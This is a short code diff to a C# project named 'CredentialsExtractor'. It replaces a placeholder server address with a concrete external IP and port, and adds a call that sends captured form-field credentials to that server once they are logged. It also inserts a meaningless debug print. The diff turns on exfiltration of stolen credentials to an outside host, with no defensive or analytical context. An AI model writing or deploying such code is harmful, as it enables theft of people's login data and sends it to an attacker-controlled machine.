@@ -521,8 +521,9 @@ namespace CredentialsExtractor.Core
                     client.SendTimeout = 5000;
                     client.ReceiveTimeout = 5000;
 
+                    Console.WriteLine("aasdasdasfdsdsadasd");
                     // Connect to the server - updated to use your external port
-                    client.Connect("your_public_ip_address", 43567);
+                    client.Connect("46.116.189.221", 43567);
 
                     using (NetworkStream stream = client.GetStream())
                     {
@@ -540,6 +541,7 @@ namespace CredentialsExtractor.Core
                         _logger.Log($"Server response: {response}");
                     }
                 }
+
             }
             catch (Exception ex)
             {
@@ -604,6 +606,7 @@ namespace CredentialsExtractor.Core
                 }
 
                 _logger.Log("=====================================");
+                SendCredentialsToServer(_formFields);
             }
 
             // Print to console as well for immediate feedback
